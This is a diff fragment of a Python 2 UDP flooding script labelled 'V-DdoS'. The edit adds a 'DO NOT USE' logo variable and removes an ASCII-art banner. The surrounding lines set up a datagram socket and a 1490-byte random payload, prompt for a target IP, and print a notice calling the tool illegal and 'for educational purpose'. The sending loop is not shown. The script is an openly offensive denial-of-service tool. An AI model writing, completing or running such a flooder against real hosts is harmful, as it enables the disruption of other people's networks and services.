@@ -11,6 +11,7 @@ minute = now.minute
 day = now.day
 month = now.month
 year = now.year
+logo = "DO NOT USE"
 
 ##############
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
@@ -19,13 +20,6 @@ bytes = random._urandom(1490)
 
 os.system("clear")
 os.system("figlet V-DdoS")
-print "
-██████╗░██████╗░░█████╗░░██████╗████████╗░█████╗░
-██╔══██╗██╔══██╗██╔══██╗██╔════╝╚══██╔══╝██╔══██╗
-██║░░██║██║░░██║██║░░██║╚█████╗░░░░██║░░░██║░░██║
-██║░░██║██║░░██║██║░░██║░╚═══██╗░░░██║░░░██║░░██║
-██████╔╝██████╔╝╚█████╔╝██████╔╝░░░██║░░░╚█████╔╝
-╚═════╝░╚═════╝░░╚════╝░╚═════╝░░░░╚═╝░░░░░░░░░░░"
 print "Note- This Tool An Illegal Tool & It's Only For Educational Purpose.. Use It At Your Own Risk,We'll Be Not Responsible For Kind Of Problems"
 print
 ip = raw_input("IP Target : ")
